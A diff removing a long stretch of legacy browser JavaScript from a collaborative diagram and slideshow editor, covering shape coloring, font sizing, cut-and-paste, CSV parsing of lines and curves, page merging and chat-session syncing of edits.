-           tbl.rows[j].cells[i].style.borderWidth = '0px';
-       }
-        sel.style.fontWeight = '700';
-        sel.style.border = '1px orange solid';
-        if (numsselected!=null)
-        for (var i=0; i < numsselected.length; i++)
-        {
-            num = numsselected[i];
-            savedfontrate = fs/allShapes[num].fontsize;
-            allShapes[num].base.style.fontSize = fs + 'px';
-            cachedfontsize = fs + 'px';
-            allShapes[num].fontsize = fs;
-            done(num);
-        }
-    }
-    else if (cd == 5)
-    {
-        var ori = $('orient').innerHTML.charCodeAt(0);
-        var ij =  1;
-        if (ori  ==  8593 ) ij =  -1;
-        fs += ij;
-        if (fs > 6 ){
-        sel.innerHTML = '' + fs;
-        allfonts[ii] = fs;}
-    }
-    //canceldia(num,1);
-}
-function changeorient(td)
-{
-    var ori = td.innerHTML.charCodeAt(0);
-    if (ori  ==  8593 )
-        td.innerHTML = '&darr;'
-    else
-        td.innerHTML = '&uarr;'
-}
-function changecolorb(sel,  num, cd, cl)
-{
-      hassaved = false;
-      var tbl = sel.parentNode.parentNode;
-      if (tbl.tagName.toLowerCase() != 'table')
-      {
-          tbl = sel.parentNode.parentNode.parentNode;
-      }
-      var iii = 0;
-      for (var j=0; j < tbl.rows.length; j++)
-      for (var i=0; i < tbl.rows[j].cells.length; i++)
-      {
-          tbl.rows[j].cells[i].style.border = '1px transparent solid';
-          if (tbl.rows[j].cells[i]==sel)
-              iii = j*tbl.rows[0].cells.length + i;
-      }
-      sel.style.border = '1px orange solid';
-      if (cd==0)
-      {
-
-          document.body.className = null;
-          if (cl < 10)
-          {
-
-          if ($('chkgradient').checked)
-          {
-              if ($('bgurl').value.indexOf(',')>0)
-              {
-                 $('bgurl').value = $('bgurl').value.replace(/,$/,'') + "," + bcolors[cl];
-                 document.body.style.background = null;
-                 document.body.style.backgroundImage = 'linear-gradient(to right,' + $('bgurl').value + ")";
-                 document.body.style.backgroundColor = bcolors[cl];
-                 bgarr[pagenum] = $('bgurl').value;
-              }
-              else if ($('bgurl').value.length < 15)
-              {
-                 document.body.style.background = null;
-                 document.body.style.backgroundImage = null;
-                 document.body.style.backgroundColor = bcolors[cl];
-                 $('bgurl').value = bcolors[cl] + ",";
-                 bgarr[pagenum] = "";
-              }
-              if (chatsessionnum > -1 && num == null)
-              {
-                  parent.sendObject(chatsessionnum,'g' + bcolors[cl]);
-              }
-          }
-          else
-          {
-              document.body.style.backgroundImage = null;
-              document.body.style.backgroundColor = bcolors[cl];
-              if ($('bgurl').value.length > 15)
-                  document.body.style.background = "url(" + $('bgurl').value + ") " + bcolors[cl];
-              else
-                  document.body.style.background = "url() " + bcolors[cl];
-              bgarr[pagenum] = $('bgurl').value;
-              if (chatsessionnum > -1 && num == null)
-              {
-                  parent.sendObject(chatsessionnum,'g' + bcolors[cl]);
-              }
-          }
-      }
-      else
-      {
-           document.body.style.background = null;
-           document.body.style.backgroundImage = null;
-           document.body.className = "shapebg" + (cl-10);
-           bgarr[pagenum] = ""+(cl-10) + " " +  hexcolor(document.body.style.backgroundColor);
-      }
-      }
-      else if (cd == 1)
-      {
-         for (var i=0; i < numsselected.length; i++)
-         {
-              num = numsselected[i];
-              var z = allShapes[num];
-              if (cl>9)
-              {
-                  z.bcolor = cl;
-                  if (z.isrect() && (z.ispic == 0 || z.ispic == 3))
-                  {
-                      z.base.style.backgroundColor = null;
-                      z.base.style.backgroundImage = null;
-                      z.base.className = 'shapebg' + (cl-10);
-                  }
-                  else if (z.shapename == 'diamond')
-                  {
-                      z.base.className = null;
-                      var dv =  $('g'+num);
-                      dv = dv.getElementsByTagName('div')[0];
-                      dv.style.backgroundImage =  null;
-                      dv.className = 'shapebg' + (cl-10);
-                      dv.style.backgroundColor = null;
-                  }
-                  else if (z.shapename == 'hexgon')
-                  {
-                       z.base.className = null;
-                       var dv =  $('g'+num);
-                       var tr = dv.getElementsByTagName('table')[0].rows[0];
-                       tr.cells[0].getElementsByTagName('div')[0].style.borderRightColor = "transparent";
-                       tr.cells[1].style.backgroundImage   = null;
-                       tr.cells[1].style.backgroundColor   = null;
-                       tr.cells[2].getElementsByTagName('div')[0].style.borderLeftColor = "transparent";
-                       tr.cells[1].className = 'shapebg' + (cl-10);
-                       var mt = tr.cells[1].offsetHeight;
-                       tr.cells[1].innerHTML = "<div class=shapebg" + (cl-10)  + " style=\"margin:-1px 0px 0px  0px;height:" + mt + "px;width:" +((mt/1.732))
-           +  "px;\"><!----></div><div class=shapebg" + (cl-10)  + " style=\"z-index:-3;margin:-" + (mt) + "px 0px 0px  0px;height:" + mt + "px;width:" +((mt/1.732))
-           +  "px;transform:rotate(60deg)\"><!----></div><div class=shapebg" + (cl-10)  + " style=\"z-index:-3;margin:-" + (mt) + "px 0px 0px 0px;height:" + mt + "px;width:" +((mt/1.732))
-           +  "px;transform:rotate(-60deg)\"><!----></div>";
-                  }
-                  else
-                  {
-                      var dv =  $('g'+num);
-                      if (dv!=null) dv.style.color = null;
-                  }
-              }
-              else {
-
-              if (z.isrect() && (z.ispic == 0 || z.ispic == 3))
-              {
-                  z.base.className = null;
-                  if ( (z.fc & 8) == 0)
-                  {
-
-                      z.base.style.backgroundColor = bcolors[cl];
-                      z.base.style.backgroundImage = null;
-                  }
-                  else
-                  {
-                      z.base.style.backgroundColor = bcolors[cl];
-                      z.base.style.backgroundImage = gradient(bcolors[cl],z.shapename);
-                  }
-              }
-              else if (z.shapename == 'diamond')
-              {
-
-                  var dv =  $('g'+num);
-                  z.base.className = null;
-                  if ( (z.fc & 8) == 0)
-                  {
-                      dv = dv.getElementsByTagName('div')[0];
-                      dv.className = null;
-                      dv.style.backgroundImage = null;
-                      dv.style.backgroundColor =  bcolors[cl];
-                  }
-                  else
-                  {
-                      dv = dv.getElementsByTagName('div')[0];
-                      dv.className = null;
-                      dv.style.backgroundImage = gradient(bcolors[cl]);
-                      dv.style.backgroundColor = null;
-                  }
-              }
-              else if (z.shapename == 'hexgon')
-              {
-                  var dv =  $('g'+num);
-                  if ( (z.fc & 8) == 0)
-                  {
-                       var tr = dv.getElementsByTagName('table')[0].rows[0];
-                       tr.cells[0].className = null;
-                       tr.cells[1].className = null;
-                       tr.cells[2].className = null;
-                       tr.cells[0].getElementsByTagName('div')[0].style.borderRightColor = bcolors[cl];
-                       tr.cells[1].style.backgroundImage   = null;
-                       tr.cells[1].style.backgroundColor   = bcolors[cl];
-                       tr.cells[2].getElementsByTagName('div')[0].style.borderLeftColor = bcolors[cl];
-                       tr.cells[1].innerHTML = "<!---->";
-                  }
-                  else
-                  {
-                       var bf = gradient(bcolors[cl]).replace(/\(/,'(to right,');
-                       var twocolors = bf.replace(/[^#]+(#[0-9|a-f]+)[^#]+(#[0-9|a-f]+).*/,'$1,$2').split(/,/);
-                       var tr = dv.getElementsByTagName('table')[0].rows[0];
-                       tr.cells[0].className = null;
-                       tr.cells[1].className = null;
-                       tr.cells[2].className = null;
-                       tr.cells[0].getElementsByTagName('div')[0].style.borderRightColor = twocolors[0];
-                       tr.cells[1].style.background   = bf;
-                       tr.cells[1].innerHTML = "<!---->";
-                       tr.cells[2].getElementsByTagName('div')[0].style.borderLeftColor = twocolors[1];
-                  }
-              }
-              else
-              {
-                  var dv =  $('g'+num);
-                  if (dv!=null) dv.style.color = bcolors[cl];
-              }
-              cachedbgcolor = allShapes[num].bcolor = cl;
-              }
-              sendObject(num);
-         }
-      }
-      else if (cd == 5)
-      {
-
-          if (iii < bcolors.length-1)
-          {
-           $('hiddencolorb').value = bcolors[cl];
-          $('hiddencolorb').click();
-          cachediii = iii;
-          cachedtd = sel;
-          } else
-          {
-              myprompt(textmsg[1642].replace(/@.*/,''));
-          }
-
-      }
-}
-var cachedtd;
-var cachediii;
-function childcolor(x,col)
-{
-    if (x==null) return;
-    if (x.tagName.toLowerCase()=='tbody'||x.tagName.toLowerCase()=='td'||x.tagName.toLowerCase()=='div' || x.tagName.toLowerCase()=='table' || x.tagName.toLowerCase()=='tr'
-            )
-    {
-        if (x.style!=null&&(x.tagName.toLowerCase()=='td'||x.tagName.toLowerCase()=='div') && x.style.color!=null && hexcolor(x.style.color)!='#cddcc2')
-            x.style.color = col;
-        if (x.childNodes == null) return;
-        else for (var i=0; i < x.childNodes.length; i++)
-           if (typeof(x.childNodes[i].tagName)!='undefined')
-        childcolor(x.childNodes[i],col);
-    }
-}
-function changecolor(sel,  num, cd, cl)
-{
-    if (cd == 0)
-    {
-        childcolor($('toolbar'),colors[cl]);
-        menufontcolor = cl;
-        childcolor($('selplay'),colors[cl]);
-        childcolor($('selpage'),colors[cl]);
-        childcolor($('selfile'),colors[cl]);
-        
-        return;
-    }
-    hassaved = false;
-    var tbl = sel.parentNode.parentNode;
-      if (tbl.tagName.toLowerCase() != 'table')
-      {
-          tbl = sel.parentNode.parentNode.parentNode;
-      }
-
-      var iii = 0;
-      for (var j=0; j < tbl.rows.length; j++)
-      for (var i=0; i < tbl.rows[j].cells.length; i++)
-      {
-          tbl.rows[j].cells[i].style.border = '1px transparent solid';
-          if (tbl.rows[j].cells[i]==sel)
-               iii = j*tbl.rows[0].cells.length + i;
-      }
-      sel.style.border = '1px orange  solid';
-      if (numsselected!=null)
-      for (var i=0; i < numsselected.length; i++)
-     {
-        num = numsselected[i];
-        if (cd== 1)
-        {
-          var z = allShapes[num];
-          if (z.ispic == 1)
-          {
-              z.base.style.borderColor = colors[cl];
-          }
-          else if (z.ispic == 2)
-          {
-              z.base.getElementsByTagName('img')[0].style.borderColor = colors[cl];
-          }
-          else if (z.shapename == 'diamond')
-              $('g'+num).getElementsByTagName('div')[0].style.borderColor = colors[cl];
-          else if (z.shapename == 'hexgon' && (z.fc & 1) == 0 )
-          {
-              var g = $('f'+num).getElementsByTagName('table')[0].rows[0];
-              g.cells[0].getElementsByTagName('div')[0].style.borderRightColor = colors[cl];
-              g.cells[1].style.backgroundColor = colors[cl];
-              g.cells[2].getElementsByTagName('div')[0].style.borderLeftColor = colors[cl];
-          }
-          else if (z.isrect() || z.ispic == 3)
-              z.base.style.borderColor = colors[cl];
-          allShapes[num].base.style.color = colors[cl];
-          cachedcolor =  allShapes[num].color = cl
-          var tbls = $('p'+ num); if (tbls!=null) tbls = tbls.getElementsByTagName('table');
-          if (tbls!=null)for (var k=0; k < tbls.length; k++)
-          {
-              tbls[k].style.borderColor = colors[cl];
-          }
-          sendObject(num);
-        }
-        else if (cd== 2)
-        {
-
-           allLines[num].color = cl;
-           allLines[num].redraw();
-           cachedlinecolor = cl;
-           //canceldia(num,cd);
-        }
-        else if (cd== 4)
-        {
-           cachedcurvecolor = cl;
-           allCurves[num].color = cl;
-           allCurves[num].redraw();
-           //canceldia(num,cd);
-        }
-         else if (cd == 5)
-         {
-          $('hiddencolorf').value = colors[cl];
-          $('hiddencolorf').click();
-          cachediii = iii;
-          cachedtd = sel;
-         }
-    }
-}
-
-function changethatcolor(txt,c)
-{
-    if (c == 'b')
-    {
-        cachedtd.style.backgroundColor = txt.value;
-        bcolors[cachediii] = txt.value;
-    }
-    else if (c =='f')
-    {
-        cachedtd.style.color = txt.value;
-        colors[cachediii] = txt.value;
-    }
-}
-var cutshape = null;
-function dodelete(num,cd)
-{
-    if ($("m" + num + "_" + cd) == null) return;
-
-    hassaved = false;
-    if (numsselected!=null)
-    {
-    cutshape = [];
-    cutkframe = [];
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        if (cd== 1)
-        {
-            if (true)// allShapes[ num ].inediting== false)
-            {
-                cutkframe[cutshape.length] = kframes[pagenum + '_' + num];
-                cutshape[cutshape.length] = allShapes[ num ].toString();
-                
-                sendObject(num,'d');
-                allShapes[ num ].delme(1);
-            }
-            else
-            {
-                myprompt(textmsg[1657]);
-
-            }
-        }
-        else if (cd== 2)
-        {
-            allLines[ num ].delme();
-            if (chatsessionnum > -1 )
-           {
-                parent.sendObject(chatsessionnum,  num + " l");
-           }
-        }
-        else if (cd== 4)
-        {
-            allCurves[ num ].delme();
-            if (chatsessionnum > -1 )
-           {
-                parent.sendObject(chatsessionnum,  num + " c");
-           }
-        }
-    }
-    }
-    canceldia(num,cd);
-
-}
-var cutkframe = [];
-function copyshape(num)
-{
-
-    cutshape = new Array(numsselected.length);
-    cutkframe = new Array(numsselected.length);
-    for (var j=0; j < numsselected.length; j++)
-    {
-        num=numsselected[j] ;
-        cutshape[j] = allShapes[ num ].toString();
-        cutkframe[j] = copyk(kframes[pagenum + '_' + num]);
-    }
-    canceldia(num,1);
-}
-function pasteshape(num)
-{
-    hassaved = false;
-    var dv = $("m0_0" );
-    if (chatsessionnum > -1 && num == null)
-    {
-        parent.sendObject(chatsessionnum,'s');
-    }
-    else if (num!=null)
-    {
-        var z = new Shape(num);
-        z.parse(cutshape[cutshape.length-1]);
-        if (cutkframe[cutshape.length-1]!=null)
-        kframes[pagenum + '_' + num] = copyk(cutkframe[cutshape.length-1]);
-        z.x =  parseInt(dv.style.left.replace(/px/,''));
-        z.y = parseInt(dv.style.top.replace(/px/,''));
-        z.visible = 1;
-          z.initbase();
-          z.init();
-          z.setup();
-          z.animates();
-        canceldia(0,0);
-        sendObject(num);
-    }
-    else if (num == null)
-    {
-       var j = 0;
-       for (var n=numShapes;  j < cutshape.length; j++,n++)
-       {
-          var z = new Shape(n);
-           z.parse(cutshape[j]);
-           if (cutkframe[j]!=null)
-           kframes[pagenum + '_' + n] = copyk(cutkframe[j]);
-           
-          z.visible = 1;
-          z.initbase();
-          z.init();
-          z.setup();
-          z.animates();
-       }
-    }
-}
-function canceldia(num,cd)
-{
-    var xx = $('myprompt');
-    if (xx!=null) document.body.removeChild(xx);
-    if (cd == 0 && num == 0)
-    {
-        var bg = $('bgurl');
-        if (bg!=null && bg.value!='' && bg.value.length > 12)
-            setdocbg(bg.value);
-    }
-    if (cd == 1 && frameupdated && numsselected!=null)
-    {
-        for (var i=0; i < numsselected.length; i++)
-        {   
-            genkeyframes(numsselected[i]);
-            allShapes[numsselected[i]].animates();
-        }
-        frameupdated = false; 
-    }
-    numsselected = null;
-    var md = $("m" + num + "_" + cd);
-    if (md != null)
-        document.body.removeChild(md);
-    hasone = null;
-    cdbeing = -1;
-    document.onmousemove = onmouseover0;
-    if ($('tdbg')!=null)
-    var j = hexcolor($('tdbg').style.backgroundColor);
-    if (cd==0 && num==0 && md!=null&& editable)
-    {
-        startbg($('tdbg'));
-        $('selfile').style.visibility = 'hidden';
-        $('selpage').style.visibility = 'hidden';
-        $('selplay').style.visibility = 'hidden';
-    }
-}
-
-var copyk  = function(k)
-   {
-       if (k == null) return null;
-       var x = new Object();
-       x.esn = k.esn; x.ets=k.ets; x.etm = k.etm;
-       x.ssn = k.ssn; x.sts=k.sts; x.stm = k.stm; x.loop = k.loop;
-       x.lsn = k.lsn; x.lts=k.lts; x.ltm = k.ltm; 
-       return x; 
-   }
-
-function constructshape(num,str, xx, yy)
-{
-     var z = new Shape(num);
-     numbeing = num;
-     z.parse(str);
-     if (z.x == null) z.x = xx;
-     if (z.y == null) z.y = yy;
-       
-        if ( constructshape.caller.name==null || constructshape.caller.name.indexOf('choosesn') >= 0)
-        {
-            z.visible = 1;
-            z.initbase();
-            z.init();
-           
-        }
-        else  if ( constructshape.caller.name==null || constructshape.caller.name.indexOf('exebuffered') < 0)
-        {
-            z.initbase();
-            z.init();
-            z.setup();
-        }
-        else   if (createmove == null)
-        {
-            z.initbase();
-            z.init();
-            
-            if (num>=0 && num  < allShapes.length)
-            setTimeout("allShapes[" + num + "].move(" + x + "," + y + ")",5);
-            var em = $("sound");
-            if (em!=null) em.Play();
-            
-        }
-        else
-        {
-            z.initbase();
-            z.init();
-            if ((num>=0 && num  < allShapes.length))
-            setTimeout("allShapes[" + num + "].move(" + x + "," + y + ")",5);
-            
-        }
-        
-        return z;
-}
-function constructline(num, str)
-{
-         var i = 0;
-         var parser = new CSVParse(str,"'", ",", "\r\n");
-         var type = parser.nextElement();
-         if (type == null) return null;
-         var startn = parseInt(parser.nextElement());
-         if (''+startn=='NaN') return null;
-         var sx = parseFloat(parser.nextElement());
-         if (''+sx == 'NaN') return null;
-         var y = parser.nextElement();
-         if (y==null) return null;
-         if (isNaN(''+y))
-         {
-             var sy =  allShapes[startn].positionbyfn(y);
-         }
-         else
-             sy = parseFloat(y);
-
-         var endn = parseInt(parser.nextElement());
-         if (''+endn == 'NaN') return null;
-         var ex = parseFloat(parser.nextElement());
-         if (''+ex== 'NaN') return null;
-         y = parser.nextElement();
-         if (y == null) return null;
-
-         if (isNaN(''+y))
-         {
-             var ey =  allShapes[(endn)].positionbyfn(y);
-         }
-         else
-             ey = parseFloat(y);
-
-         var thick = parser.nextElement();
-         if (thick==null) thick = '1';
-         var direct = parser.nextElement();
-         if (direct==null) direct = '1';
-         var time = parser.nextElement();
-         if (time==null) time = '0_1';
-          var tm = 1;
-          var start = 0;
-       var st = time.split(/_/);
-       if (!isNaN(st[0])) 
-          start = parseFloat(st[0]);
-       if (st.length>1 &&!isNaN(st[1]))
-         tm = parseFloat(st[1]);
-        
-         var cn = 0;
-         var color = parser.nextElement();
-         if (color==null) color = 'black';
-         if (isNaN(color))
-            cn = rcolor(color);
-         else
-            cn = parseInt(color);
-         sentline = true;
-         var zi = parser.nextElement(); if (zi==null) zi = '0';
-         var l =  (new Line(num,type, (startn), (sx),sy, (endn) , (ex),ey,parseInt(thick),parseInt(direct),start, tm, cn,parseInt(zi)));
-
-         return l;
-}
-
-function constructcurve(num, str)
-{
-     var i = 0,x,y  = 0;
-     var parser = new CSVParse(str, "'", ",", "\r\n");
-
-     var type = parser.nextElement();
-     if (type == null) return null;
-     var thick = parseInt(parser.nextElement());
-     if (thick==null) return null;
-     var color = parser.nextElement();
-     if (color == null) return null;
-     var tm = parser.nextElement();
-     if (tm == null) return null;
-     var start = 0;
-     var time = 2;
-     if (tm!=null)
-   {
-       var st = tm.split(/_/);
-       if (!isNaN(st[0])) 
-           start = parseFloat(st[0]);
-       if (st.length>1 &&!isNaN(st[1]))
-           time = parseFloat(st[1]);
-   }
-     var zi = parser.nextElement();
-     var points = [];
-     while (true)
-     {
-         x = parser.nextElement();
-         y = parser.nextElement();
-         if (x ==null || y == null) break;
-         if (i == 0)
-            points[i] = [parseInt(x),parseInt(y)];
-         else
-         {
-            points[i] = [parseInt(x) + points[i-1][0], parseInt(y) + points[i-1][1]];
-         }
-         i++;
-     }
-
-     sentline = true;
-     var cn = 0;
-     if (isNaN(color))
-        cn = rcolor(color);
-     else
-        cn = parseInt(color);
-     return (new Curve(num, type, thick, cn,start, time, parseInt(zi), points));
-}
-
-function initial()
-{
-     hw.parseAttach(attachstr);
-     document.f.attach.value = attachstr;
-     favorx = 5;
-     favory = 35;
-     mfavory = 0;
-     allShapes = [];
-     numShapes = 0;
-     if (shapearr[pagenum]!= null)
-     for (var i=0; i < shapearr[pagenum].length; i++)
-     {
-        var z = constructshape(i,shapearr[pagenum][i]);
-        if (ismakingtab==1)
-        {
-           genkeyframes(i);
-           z.animates();
-        }
-        else
-        {
-            
-        }
-        z.visible = 1;
-        z.base.style.visibility = 'visible';
-     }
-     if (ismakingtab==1 && linearr[pagenum]!= null)
-     for (i=0; i < linearr[pagenum].length; i++)
-     {
-         constructline(null, linearr[pagenum][i]);
-     }
-     if (ismakingtab==1 && curvearr!=null)
-     for (i=0; curvearr[pagenum]!=null && i < curvearr[pagenum].length; i++)
-     {
-         constructcurve(null, curvearr[pagenum][i]);
-     }
-     document.onmousemove = onmouseover0;
-      
-}
-function getInputSelection(el)
-{
-    var start = 0;
-    var end = 0;
-    var normalizedValue;
-    var range;
-    var textInputRange;
-    var len;
-    var endRange;
-
-    if (typeof el.selectionStart == "number" && typeof el.selectionEnd == "number")
-    {
-        start = el.selectionStart;
-        end = el.selectionEnd;
-    }
-    else
-    {
-        range = document.selection.createRange();
-
-        if (range && range.parentElement() == el)
-        {
-            len = el.value.length;
-            normalizedValue = el.value.replace(/\r\n/g, "\n");
-            textInputRange = el.createTextRange();
-            textInputRange.moveToBookmark(range.getBookmark());
-            endRange = el.createTextRange();
-            endRange.collapse(false);
-
-            if (textInputRange.compareEndPoints("StartToEnd", endRange) > -1)
-            {
-                start = end = len;
-            }
-            else
-            {
-                start = -textInputRange.moveStart("character", -len);
-                start += normalizedValue.slice(0, start).split("\n").length - 1;
-
-                if (textInputRange.compareEndPoints("EndToEnd", endRange) > -1)
-                {
-                    end = len;
-                }
-                else
-                {
-                    end = -textInputRange.moveEnd("character", -len);
-                    end += normalizedValue.slice(0, end).split("\n").length - 1;
-                }
-            }
-        }
-    }
-
-    selectstart = start,
-    selectend = end;
-}
-function makevisible(n)
-{
-    allShapes[n].visible = 1;
-    allShapes[n].base.style.visibility = 'visible';
-    if (allShapes[n].shapename == 'diamond' && $('u' + n)!=null)
-        $('u' + n).style.visibility = 'visible';
-    //Play.appear(n);
-}
-function makehidden(n)
-{
-    allShapes[n].visible = 0;
-    allShapes[n].base.style.visibility = 'hidden';
-   
-}
-function savetocache()
-{
-
-    if (hassaved == false)
-    {
-       var str = toString();
-
-       //SetCookie("UMLtoolstr", "" + ((new Date()).getTime()) + " " + filename + " " + pagenum + " " + str);
-    }
-}
-
-function initialdraw()
-{
-     notcached(false);
-     if (editable && chatsessionnum==-1)
-     {
-         cachedone(true);
-     }
-}
-function makeframe()
-{
-    document.write("<iframe name=\"" + iframename + "\" width=1  height=1 style=\"visibility:hidden\" />");
-    //if (saveable()) document.f.filedir.style.fontWeight = 700;
-}
-
-
-
-
-function pickthis(sp)
-{
-    if (sp.innerHTML.toLowerCase()!='&nbsp;&nbsp;')
-    mergeto(null, parseInt(sp.innerHTML.replace(/[^0-9]/g,''))-1);
-    var tbl = sp.parentNode.parentNode
-    if (tbl.tagName.toLowerCase()!='table') tbl = tbl.parentNode;
-    document.body.removeChild(tbl);
-}
-function mergeto(sel,pn)
-{
-   var pp = pagenum;
-   hassaved = false;
-   if (pn == null)
-       pn = parseInt(sel.value.replace(/[^0-9]/g,''))-1;
-   var xy=[];
-   makeintostring(xy);
-
-   delall();
-   var lower = 0;
-   if (pagenum < pn)
-       lower = 1;
-   pagenum = pn;
-   initial();
-   hw.parseAttach(attachstr);
-   var my = 40;
-   for (var i=0; i < numShapes; i++)
-   {
-      if (allShapes[i]!= null)
-      {
-          var bt = allShapes[i].y+allShapes[i].base.offsetHeight;
-          if (bt > my) my = bt;
-      }
-   }
-   var ns = numShapes;
-   for (i=0; i < shapearr[pp].length; i++)
-   {
-       constructshape(i,shapearr[pp][i], xy[i][0], xy[i][1]+my+10);
-   }
-   for (i=0; i < linearr[pp].length; i++)
-   {
-         var parser = new CSVParse(linearr[pp][i],"'");
-         var type = parser.nextElement();
-         var startn = parseInt(parser.nextElement()) + ns;
-         if (''+startn=='NaN') continue;
-         var sx = parseFloat(parser.nextElement());
-         if (sx == null) continue;
-         var y = parser.nextElement();
-         if (y==null) continue;
-         if (isNaN(''+y))
-         {
-             var sy =  allShapes[startn].positionbyfn(y);
-         }
-         else
-             sy = parseFloat(y);
-         
-         var endn = parseInt(parser.nextElement()) + ns;
-         var ex = parseFloat(parser.nextElement());
-         var y = parser.nextElement();
-         if (''+endn=='NaN') continue;
-         if (y==null) return null;
-         if (isNaN(''+y))
-         {
-             var ey =  allShapes[endn].positionbyfn(y);
-         }
-         else
-             ey = parseFloat(y);
-         
-         var thick = parser.nextElement();
-         var direct = parser.nextElement();
-         var time = parser.nextElement();
-         var tm = 2;
-         var start = 0;
-         if (time==null) time = "0_2";
-          var st = time.split(/_/);
-       if (!isNaN(st[0])) 
-          start = parseFloat(st[0]);
-       if (st.length>1 &&!isNaN(st[1]))
-         tm = parseFloat(st[1]);
-        
-         var cn = 0;
-         var color = parser.nextElement();
-         if (color==null) color = 'black';
-         if (isNaN(color))
-            cn = rcolor(color);
-         else
-            cn = parseInt(color);
-         var zi = parser.nextElement(); if (zi==null) zi = '0';
-         new Line(drawinenumber,type,startn,sx,sy,endn ,ex,ey,parseInt(thick),direct,start,tm,cn,parseInt(zi));
-   }
-
-   for (; pp<linearr.length-1;pp++)
-   {
-       shapearr[pp] = shapearr[pp+1]
-       linearr[pp] = linearr[pp+1];
-       allies[pp] = allies[pp+1];
-   }
-   shapearr[pp] = null;
-   linearr[pp] = null;
-   pagenum -= lower;
-   $('tdpage').innerHTML = textmsg[1854].replace(/@/,''+ (pagenum+1));
-   canceldia(0,0);
-}
-
-function allowmove(c)
-{
-   canceldia(0,3);
-   var xx = $("toolbar");
-
-   if (c == 0)
-   {
-   toolbarxy = findPositionnoScrolling(xx);
-   var holdpos = $("holdpos");
-   if (holdpos==null)
-   {
-       holdpos = document.createElement("div");
-       holdpos.id = "holdpos";
-       holdpos.cssText = "width:" + xx.offsetWidth + "px;height:" + xx.offsetHeight +"px";
-       document.body.insertBefore(holdpos, xx);
-   }
-   xx.style.position = "absolute";
-   var my = 40;
-   for (var i=0; i < numShapes; i++)
-   {
-      if (allShapes[i]!= null)
-      {
-          var bt = allShapes[i].y+allShapes[i].base.offsetHeight;
-          if (bt > my) my = bt;
-      }
-   }
-   xx.border = "0";
-   xx.cellpadding = "5";
-   xx.style.top = my + 'px';
-   xx.style.left = toolbarxy[0] + 'px';
-   xx.style.height = "16px";
-   window.scrollTo(0, bt);
-   }
-   else
-   {
-       xx.style.position = "";
-       xx.style.height = "16px";
-     //  xx.align = "center";
-
-       var xy = $("holdpos");
-       if (xy!= null){
-       document.body.insertBefore(xx, xy);
-       document.body.removeChild(xy);
-       window.scrollTo(0, 0);
-       }
-   }
-
-}
-var createmove = null;
-var linenums = null;
-function redrseline()
-{
-    if (linenums == null) return;
-    for (var j=0; j < linenums.length; j++)
-    {
-        var x = linenums[j];
-        allLines[x.num] = constructline(x.num, x.str);
-    }
-    linenums = null;
-}
-var bufferedcommand =null;
-function exebuffered()
-{
-    if (bufferedcommand!=null)
-    {
-       var xx = constructshape(bufferedcommand.num,bufferedcommand.str);
-       if (xx == null) return;
-       allShapes[bufferedcommand.num] = xx;
-       if (ismakingtab == 1 &&  typeof(LaTexHTML) != 'undefined')
-       {
-           LaTexHTML.formatele(allShapes[bufferedcommand.num].base);
-       }
-       if (!allShapes[bufferedcommand.num].isrect())
-            allShapes[bufferedcommand.num].gooddim();
-
-       bufferedcommand = null;
-
-    }
-}
-function createupdate(str)
-{
-    var j =  str.indexOf(" ");
-    if (j == -1)
-    {
-        if (str.charAt(0) == 'b')
-        {
-            setdocbg(str.substring(1));
-        }
-        else (str.charAt(0) == 'g')
-        {
-            document.body.style.backgroundColor = (str.substring(1));
-        }
-        return;
-    }
-    var num = parseInt( str.substring(0, j));
-    var c =  str.charAt(1 + j);
-    if (2+j <  str.length )
-         str = str.substring(2 + j);
-    else
-         str = '';
-    if (c == 's')
-    {
-        if (allShapes[num] != null)
-        {
-            createmove = [allShapes[num].x, allShapes[num].y];
-            linenums = [];
-            for (var j=0; j < allLines.length; j++)
-            {
-                if (allLines[j].startnum == num || allLines[j].endnum == num)
-                {
-                    linenums[linenums.length] = {num:allLines[j].num, str:allLines[j].toString()};
-                    allLines[j].delme();
-                }
-            }
-            allShapes[num].delme(false);
-        }
-        else
-        {
-            createmove = null;
-        }
-        if (str !='')
-        {
-            bufferedcommand  = {num:num,str:str};
-            var delay = 10;
-            if (linenums!=null) delay += linenums.length*400;
-            setTimeout('exebuffered()', delay);
-        }
-    }
-    else if (c == 'l')
-    {
-        if (allLines[num] != null)
-            allLines[num].delme();
-        if (str!='')
-        {
-            allLines[num] = constructline(num, str);
-        }
-    }
-    else if (c == 'c')
-    {
-        if (allCurves[num] != null)
-            allCurves[num].delme();
-        if (str!='')
-        {
-            allCurves[num] = constructcurve(num, str);
-        }
-    }
-}
-function changefontfamily()
-{
-    var myfontname1 = GetCookie('telamanfontname');
-
-    if (myfontname1!=null)
-    {
-        myfontname = myfontname1;
-    }
-    else if (typeof(defaultfontfamily)!='undefined')
-    {
-        myfontname = defaultfontfamily;
-    }
-
-    var s = document.getElementsByTagName('head')[0].getElementsByTagName('style')[0];
-    s.innerHTML = s.innerHTML.replace(/font-family:arial\}/, "font-family:" + myfontname + "}"  );
-
-}
-function appendfileto()
-{
-     var tt = $('e' + numbeing);
-
-     if (tt!=null)
-         tt.value +=' '+ originalurl + '/FileOperation?did=' + ResizeUploaded.pathcode;
-     else
-         ResizeUploaded.attachman(document.f.attach);
-     attachstr = document.f.attach.value;
-     hw.parseAttach(attachstr );
-}
-var oldResizeUploadeddocuse = ResizeUploaded.docuse;
-ResizeUploaded.docuse = function()
-{
-    oldResizeUploadeddocuse();
-    appendfileto();
-
-}
-
-function showattachment(t)
-{
-    attachstr  = t;
-    hw.parseAttach(t);
-}
-
-Msg.handlepost = function(s)
-{
-    var m = new Message(s);
-    if (m.code == "newd")
-    {
-        Msg.tid = m.tid;
-
-        if (''+m.tid !='-1')
-        {
-             var url = originalurl + "/remote.jsp?t=" + tstmp + "&orgnum=" + orgnum;
-             var url1 = originalurl + "/Qrlink?url=" + Msg.hex(url);
-             var twos = textmsg[1778].split(/@/);
-
-             myprompt("<input type=radio name=remoteway onclick=\"Play.remoteway=1;\" value=1 " + (Play.remoteway==1?'checked':'') + " >" + twos[0] + "<br><input type=radio name=remoteway onclick=\"Play.remoteway=2;\" value=2 " + (Play.remoteway==2?'checked':'') + " >" + twos[1] +  '<br><span style=background-color:lightyellow;width:100% >' + url + "</span><br><input type=radio name=remoteway onclick=\"Play.remoteway=3;\" value=3 " + (Play.remoteway==3?'checked':'') + " >" + textmsg[1779] + "<br><img src=" + url1 + " width=500 />", null, null,textmsg[1771].split(/@/)[6]);
-             promptwin.style.top = '30px';
-
-             mypromptonclose(Play.quitremote);
-        }
-
-    }
-    else if (m.code == 'snap')
-    {
